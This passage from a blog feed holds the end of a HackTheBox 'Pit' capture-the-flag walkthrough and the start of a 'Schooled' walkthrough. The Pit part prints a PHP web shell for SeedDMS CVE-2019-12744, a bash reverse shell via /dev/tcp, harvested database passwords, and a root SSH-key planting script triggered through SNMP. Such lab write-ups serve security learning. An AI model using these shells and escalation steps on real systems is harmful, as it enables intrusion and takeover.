</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/20 15:13:54 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7359<span class="o">]</span>
</span></span><span class="line"><span class="cl">/CHANGELOG            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 101652<span class="o">]</span>
</span></span><span class="line"><span class="cl">/LICENSE              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 18321<span class="o">]</span>
</span></span><span class="line"><span class="cl">/TODO                 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2844<span class="o">]</span>
</span></span><span class="line"><span class="cl">/Guests.php           <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
</span></span><span class="line"><span class="cl">/GuideImages.php      <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
</span></span><span class="line"><span class="cl">/HB.php               <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
</span></span><span class="line"><span class="cl">/HDRS.php             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/20 15:22:45 <span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span></span></span></code></pre>
</figure><p>Poking <code>/CHANGELOG</code> with curl reveals the software version.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s http://dms-pit.htb/seeddms51x/seeddms/CHANGELOG  <span class="p">|</span> head 
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">                     Changes in version 5.1.15
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">- Improved import from file system
</span></span><span class="line"><span class="cl">- HTTP Proxy <span class="k">for</span> access on external extension repository can be <span class="nb">set</span>
</span></span><span class="line"><span class="cl">- Do not use unzip in ExtensionMgr anymore
</span></span><span class="line"><span class="cl">- fix version compare on info page
</span></span><span class="line"><span class="cl">- allow one page mode on search page
</span></span><span class="line"><span class="cl">- fix import of older extension versions from repository</span></span></code></pre>
</figure><h4 id="searchsploit-1">Searchsploit</h4>
<p>I feed the version to <code>searchsploit</code>, and it returns with some potential exploits. There is one for RCE.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ searchsploit seeddms
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl"> Exploit Title                                                             <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">SeedDMS 5.1.18 - Persistent Cross-Site Scripting                           <span class="p">|</span> php/webapps/48324.txt
</span></span><span class="line"><span class="cl">SeedDMS &lt; 5.1.11 - <span class="s1">&#39;out.GroupMgr.php&#39;</span> Cross-Site Scripting                 <span class="p">|</span> php/webapps/47024.txt
</span></span><span class="line"><span class="cl">SeedDMS &lt; 5.1.11 - <span class="s1">&#39;out.UsrMgr.php&#39;</span> Cross-Site Scripting                   <span class="p">|</span> php/webapps/47023.txt
</span></span><span class="line"><span class="cl">SeedDMS versions &lt; 5.1.11 - Remote Command Execution                       <span class="p">|</span> php/webapps/47022.txt
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------- ---------------------------------</span></span></code></pre>
</figure><p>The exploitation steps for the RCE vulnerability is as follow:</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions &lt;5.1.11]
</span></span></span><span class="line"><span class="cl"><span class="err"># Google Dork: [NA]
</span></span></span><span class="line"><span class="cl"><span class="err"># Date: [20-June-2019]
</span></span></span><span class="line"><span class="cl"><span class="err"># Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)
</span></span></span><span class="line"><span class="cl"><span class="err"># Vendor Homepage: [https://www.seeddms.org]
</span></span></span><span class="line"><span class="cl"><span class="err"># Software Link: [https://sourceforge.net/projects/seeddms/files/]
</span></span></span><span class="line"><span class="cl"><span class="err"># Version: [SeedDMS versions &lt;5.1.11] (REQUIRED)
</span></span></span><span class="line"><span class="cl"><span class="err"># Tested on: [NA]
</span></span></span><span class="line"><span class="cl"><span class="err"># CVE : [CVE-2019-12744]
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">Exploit Steps:
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">Step 1: Login to the application and under any folder add a document.
</span></span></span><span class="line"><span class="cl"><span class="err">Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">PHP Backdoor Code: 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">if(isset($_REQUEST[&#39;cmd&#39;])){
</span></span></span><span class="line"><span class="cl"><span class="err">        echo &#34;&lt;pre&gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="err">        $cmd = ($_REQUEST[&#39;cmd&#39;]);
</span></span></span><span class="line"><span class="cl"><span class="err">        system($cmd);
</span></span></span><span class="line"><span class="cl"><span class="err">        echo &#34;&lt;/pre&gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="err">        die;
</span></span></span><span class="line"><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">Step 3: Now after uploading the file check the document id corresponding to the document.
</span></span></span><span class="line"><span class="cl"><span class="err">Step 4: Now go to example.com/data/1048576/&#34;document_id&#34;/1.php?cmd=cat+/etc/passwd to get the command response in browser.
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">Note: Here &#34;data&#34; and &#34;1048576&#34; are default folders where the uploaded files are getting saved.</span></span></span></code></pre>
</figure><p>I will need a valid credentials for RCE.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nginx">Shell as nginx</h3>
<h4 id="seeddms-dashboard">SeedDMS Dashboard</h4>
<p><code>admin:admin</code> are the default credentials for SeedDMS.</p>
<p><div class="img-container"><img src="imgs/image-20210521014957029.png" alt="image-20210521014957029"  /></div>
</p>
<p>But these creds didn&rsquo;t work here, so I submit <code>michelle:michelle</code>, and it logs me in 😮 !</p>
<p><div class="img-container"><img src="imgs/image-20210521023728548.png" alt="image-20210521023728548"  /></div>
</p>
<h4 id="seeddms-cve-2019-12744">SeedDMS CVE-2019-12744</h4>
<p>With a valid account, I can try to reproduce the exploitation steps for remote code execution.</p>
<p>First, I will create a document by navigating to <code>Docs &gt; Users &gt; Michelle</code> (folders), and then under <code>michelle</code> folder I will add a new document.</p>
<p><div class="img-container"><img src="imgs/image-20210521025006867.png" alt="image-20210521025006867"  /></div>
</p>
<p>On the local file menu, I will browse and upload my PHP web shell.</p>
<p><div class="img-container"><img src="imgs/image-20210521025924716.png" alt="image-20210521025924716"  /></div>
</p>
<p>And the file gets uploaded.</p>
<p><div class="img-container"><img src="imgs/image-20210521030038234.png" alt="image-20210521030038234"  /></div>
</p>
<p>According to the exploit author, the uploaded web shell should be available at  <code>http://dms-pit.htb/seeddms51x/seeddms/data/1048576/63/1.php?f=id</code>, where <code>63</code> is my document ID, but I couldn&rsquo;t find it there.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ curl -s <span class="s1">&#39;http://dms-pit.htb/seeddms51x/seeddms/data/1048576/63/1.php?f=id&#39;</span>
</span></span><span class="line"><span class="cl">File not found.</span></span></code></pre>
</figure><p>The web server somehow has a weird routing, so I downloaded the SeedDMS source code to figure out its folder structure, and it was on <code>http://dms-pit.htb/seeddms51x/data/1048576/64/1.php?f=id</code>!</p>
<p><div class="img-container"><img src="imgs/image-20210521031346742.png" alt="image-20210521031346742"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>I will send a bash reverse shell to get a foothold on the box.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">/bin/bash -c <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.49/53 0&gt;&amp;1&#34;</span></span></span></code></pre>
</figure><p>On my listener:</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.241<span class="o">]</span> <span class="m">58888</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>26319<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">bash-4.4$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>992<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0</span></span></code></pre>
</figure><p>&gt;&gt; I just read and watched other writeups, and they were unable to get a foothold. Not sure why, but I did.</p>
<p><div class="img-container"><img src="imgs/image-20210521034126889.png" alt="image-20210521034126889"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-michelle">Shell as michelle</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Searching for string &ldquo;pass&rdquo; under <code>/var/www/html/seeddms51x/conf</code> reveals the database credentials.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">/var/www/html/seeddms51x/conf
</span></span><span class="line"><span class="cl">bash-4.4$  grep -Ri <span class="s2">&#34;pass&#34;</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">settings.xml:    &lt;database <span class="nv">dbDriver</span><span class="o">=</span><span class="s2">&#34;mysql&#34;</span> <span class="nv">dbHostname</span><span class="o">=</span><span class="s2">&#34;localhost&#34;</span> <span class="nv">dbDatabase</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbUser</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbPass</span><span class="o">=</span><span class="s2">&#34;ied^ieY6xoquu&#34;</span> <span class="nv">doNotCheckVersion</span><span class="o">=</span><span class="s2">&#34;false&#34;</span>&gt;
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
</figure><p>Under <code>/var/www/html/seeddms51x/data/conf</code> there is also another database credentials.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">/var/www/html/seeddms51x/data/conf
</span></span><span class="line"><span class="cl">bash-4.4$ grep -Ri pass
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">settings.xml:    &lt;database <span class="nv">dbDriver</span><span class="o">=</span><span class="s2">&#34;sqlite&#34;</span> <span class="nv">dbHostname</span><span class="o">=</span><span class="s2">&#34;localhost&#34;</span> <span class="nv">dbDatabase</span><span class="o">=</span><span class="s2">&#34;/home/www-data/seeddms51x/data/content.db&#34;</span> <span class="nv">dbUser</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbPass</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">doNotCheckVersion</span><span class="o">=</span><span class="s2">&#34;false&#34;</span>&gt;
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
</figure><p>The password <code>ied^ieY6xoquu</code> is the one that valid, but I didn&rsquo;t find anything juicy in the database.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ mysql seeddms -u seeddms -pied^ieY6xoquu -e <span class="s1">&#39;show databases;&#39;</span>
</span></span><span class="line"><span class="cl">mysql seeddms -u seeddms -pied^ieY6xoquu -e <span class="s1">&#39;show databases;&#39;</span>
</span></span><span class="line"><span class="cl">Database
</span></span><span class="line"><span class="cl">information_schema
</span></span><span class="line"><span class="cl">seeddms</span></span></code></pre>
</figure><h4 id="cockpit-tcp-9090">Cockpit (TCP 9090)</h4>
<p>Using <code>Michelle:ied^ieY6xoquu</code> on the Cockpit login page at <code>https://pit.htb:9090</code> logs me in.</p>
<p><div class="img-container"><img src="imgs/image-20210521063658472.png" alt="image-20210521063658472"  /></div>
</p>
<p>Cockpit gives terminal access through its web interface to interact with the system. I couldn&rsquo;t get my reverse shell/SSH to work because of SELinux, so I will just use this terminal and grab the user flag.</p>
<p><div class="img-container"><img src="imgs/image-20210521064953236.png" alt="image-20210521064953236"  /></div>
</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>For the SNMP enumeration, I will remember <code>/usr/bin/monitoring</code>, which turned out to be a bash script.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ cat /usr/bin/monitor
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> script in /usr/local/monitoring/check*sh
</span></span><span class="line"><span class="cl"><span class="k">do</span>
</span></span><span class="line"><span class="cl">    /bin/bash <span class="nv">$script</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span></span></span></code></pre>
</figure><p>The script takes and executes other scripts under  <code>/usr/local/monitoring/</code> which filename begins with <code>check</code> and ends with <code>sh</code>  . If I try to list the content of that directory, it returns a permission denied error.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ ls -l /usr/local/monitoring/
</span></span><span class="line"><span class="cl">ls: cannot open directory <span class="s1">&#39;/usr/local/monitoring/&#39;</span>: Permission denied</span></span></code></pre>
</figure><p>But with <code>-ld</code>, it shows that the folder has extended permission, and user <code>michelle</code> is allowed to write a file under that directory.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ ls -ld /usr/local/monitoring/
</span></span><span class="line"><span class="cl">drwxrwx---+ <span class="m">2</span> root root <span class="m">122</span> May <span class="m">20</span> 20:35 /usr/local/monitoring/
</span></span><span class="line"><span class="cl"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ getfacl /usr/local/monitoring/
</span></span><span class="line"><span class="cl">getfacl: Removing leading <span class="s1">&#39;/&#39;</span> from absolute path names
</span></span><span class="line"><span class="cl"><span class="c1"># file: usr/local/monitoring/</span>
</span></span><span class="line"><span class="cl"><span class="c1"># owner: root</span>
</span></span><span class="line"><span class="cl"><span class="c1"># group: root</span>
</span></span><span class="line"><span class="cl">user::rwx
</span></span><span class="line"><span class="cl">user:michelle:-wx
</span></span><span class="line"><span class="cl">group::rwx
</span></span><span class="line"><span class="cl">mask::rwx
</span></span><span class="line"><span class="cl">other::---</span></span></code></pre>
</figure><h4 id="from-snmp-to-rce">From SNMP to RCE</h4>
<p>From the SNMP enumeration, each time an SNMP &ldquo;walk&rdquo; is performed,  <code>usr/bin/monitor</code> will always pop up in the <code>NET-SNMP-EXTEND-MIB</code> section.</p>
<p><div class="img-container"><img src="imgs/image-20210521075856288.png" alt="image-20210521075856288"  /></div>
</p>
<p>Based on the output above, and the following  <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sect-system_monitoring_tools-net-snmp-extending"target="_blank" rel="noopener noreferrer"
>documentation</a>, there is a chance that when a SNMP walk is performed, the Net-SNMP agent will also execute <code>/usr/bin/monitor</code>.</p>
<p><div class="img-container"><img src="imgs/image-20211013161852076.png" alt="image-20211013161852076"  /></div>
</p>
<p>So, the strategy here is that I can try to write a script and save it under  <code>/usr/local/monitoring/</code>. Then I will do a SNMP walk to trigger the Net-SNMP agent to execute <code>/usr/bin/monitor</code> which will then eventually execute the script I created.</p>
<p>Now I will write a script to <code>/usr/local/monitoring/</code> that will inject my SSH public key to the root&rsquo;s authorized_keys file.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\nmkdir -p /root/.ssh/ 2&gt;/dev/null &amp;&amp; echo &#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#34; &gt; /root/.ssh/authorized_keys&#39;</span> &gt; /usr/local/monitoring/check_iamf.sh</span></span></code></pre>
</figure><p>Then I will do another  SNMP walk and wait for it to finish, or at least get to the NET-SNMP-EXTEND-MIB output line.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ snmpwalk -v 2c -c public 10.10.10.241 internet</span></span></code></pre>
</figure><p>And now if I try to SSH login as root to Pit, it logs me in.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ ssh root@10.10.10.241
</span></span><span class="line"><span class="cl">Web console: https://pit.htb:9090/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Thu May <span class="m">20</span> 21:12:44 <span class="m">2021</span> from 10.10.14.49
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1"># id</span>
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1"># ls -l</span>
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">-rwx------. <span class="m">1</span> root root <span class="m">706</span> Apr <span class="m">22</span>  <span class="m">2020</span> cleanup.sh
</span></span><span class="line"><span class="cl">drwx------. <span class="m">2</span> root root <span class="m">122</span> Apr <span class="m">18</span>  <span class="m">2020</span> monitoring
</span></span><span class="line"><span class="cl">lrwxrwxrwx. <span class="m">1</span> root root   <span class="m">9</span> May <span class="m">10</span> 11:07 null -&gt; /dev/null
</span></span><span class="line"><span class="cl">-r--------. <span class="m">1</span> root root  <span class="m">33</span> May <span class="m">20</span> 02:00 root.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1">#</span></span></span></code></pre>
</figure><p><div class="img-container"><img src="imgs/image-20210521081359037.png" alt="image-20210521081359037"  /></div>
</p>
<blockquote>
<p>Phew, I didn&rsquo;t expect this writeup to be this long. 😅🔨</p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Schooled</title>
      <link>https://fahmifj.github.io/ctf/hackthebox/schooled/</link>
      <pubDate>Thu, 16 Sep 2021 18:22:05 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/ctf/hackthebox/schooled/</guid>
      <description>Moodle exploitation using CVEs</description>
      <content:encoded><![CDATA[<p>Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, thus allowing me to install a malicious plugin to gain interactive shell access to the system. Internal enumeration reveals database credentials which can be used to recover a password from the database. The password is reused by one of the users for SSH login. This user is allowed to install FreeBSD packages with <code>sudo</code> permissions, and it can be exploited to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Stealing cookie with XSS</li>
<li>Moodle exploitation</li>
<li>Sudo exploitation on <code>pkg</code></li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full scan with nmap discovers three open ports: SSH on 22, an Apache web server on port 80 and a service that <code>nmap</code> identifies it as mysqlx.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-schooled 10.10.10.234
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-17 14:34 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.234
</span></span><span class="line"><span class="cl">Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.045s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65532</span> resets
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE REASON         VERSION
</span></span><span class="line"><span class="cl">22/tcp    open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp    open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
</span></span><span class="line"><span class="cl">33060/tcp open  mysqlx? syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port33060-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>5/17%Time<span class="o">=</span>60A2BA63%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>N
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">Service Info: OS: FreeBSD<span class="p">;</span> CPE: cpe:/o:freebsd:freebsd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 801.40 seconds</span></span></code></pre>
</figure><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---schooledhtb">TCP 80 - schooled.htb</h3>
<p>Port 80 serving a homepage of a school institution.</p>
<p><div class="img-container"><img src="imgs/image-20210518035709619.png" alt="image-20210518035709619"  /></div>
</p>
<p>In the About section, it states that this school has an online learning system using Moodle.</p>
<p><div class="img-container"><img src="imgs/image-20210518041407775.png" alt="image-20210518041407775"  /></div>
</p>
<p>The Teachers section displays the teachers of the school. This can be useful for generating username list.</p>
<p><div class="img-container"><img src="imgs/image-20210518035931687.png" alt="image-20210518035931687"  /></div>
</p>
<p>On the Contact section, there is an input form. The form submit button points to <code>/contact.php</code>, but it returns with 404.</p>
<p>At the bottom of the site, it reveals an email address and a domain name: <code>schooled.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210518035750397.png" alt="image-20210518035750397"  /></div>
</p>
<p>I will update my <code>/etc/hosts</code> with that domain name.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb&#39;</span> &gt;&gt; /etc/hosts/</span></span></code></pre>
</figure><p>Poking back the site with <code>curl</code> using its domain name reveals that it&rsquo;s the same site.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$  curl -s http://10.10.10.234/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">20750</span>
</span></span><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s http://schooled.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">20750</span></span></span></code></pre>
</figure><h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
<p>Enumerating subdomain using <code>gobuster</code> reveals that there is one called <code>moodle.schooled.htb</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ gobuster vhost -u <span class="s1">&#39;http://schooled.htb/&#39;</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:          http://schooled.htb/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:       GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:      <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:   gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:      <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/17 17:11:00 Starting gobuster in VHOST enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Found: moodle.schooled.htb <span class="o">(</span>Status:  200<span class="o">)</span> <span class="o">[</span>Size: 84<span class="o">]</span></span></span></code></pre>
</figure><p>I will update <code>/etc/hosts</code> again.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb moodle.schooled.htb&#39;</span></span></span></code></pre>
</figure><p>And it&rsquo;s different site.</p>
<figure class="highlight">
